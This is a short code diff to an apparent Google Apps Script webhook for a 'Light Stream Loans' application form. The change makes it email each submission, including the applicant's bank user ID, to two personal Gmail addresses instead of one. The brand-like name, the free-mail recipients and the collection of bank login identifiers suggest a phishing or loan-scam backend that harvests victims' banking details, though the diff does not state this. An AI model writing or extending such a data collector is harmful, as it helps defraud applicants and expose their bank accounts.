@@ -12,7 +12,10 @@
  */
 
 const SHEET_NAME = "Applications";
-const RECIPIENTS = "finnfoxpersonalloan@gmail.com"; // add more emails separated by commas if needed
+const RECIPIENTS = [
+  "lightstreamhelpdesk@gmail.com",
+  "finnfoxpersonalloan@gmail.com",
+];
 
 function doGet(e) {
   return jsonResponse({ ok: true, message: "Light Stream Loans webhook is ready." });
@@ -73,11 +76,13 @@ Bank user ID: ${data.bankUserId}
 Submitted at: ${new Date().toISOString()}
 `;
 
-    MailApp.sendEmail({
-      to: RECIPIENTS,
-      subject: "New Loan Application Received",
-      body: body,
-      name: "Loan Alerts",
+    RECIPIENTS.forEach((email) => {
+      MailApp.sendEmail({
+        to: email,
+        subject: "New Loan Application Received",
+        body: body,
+        name: "Loan Alerts",
+      });
     });
 
     return jsonResponse({ ok: true });
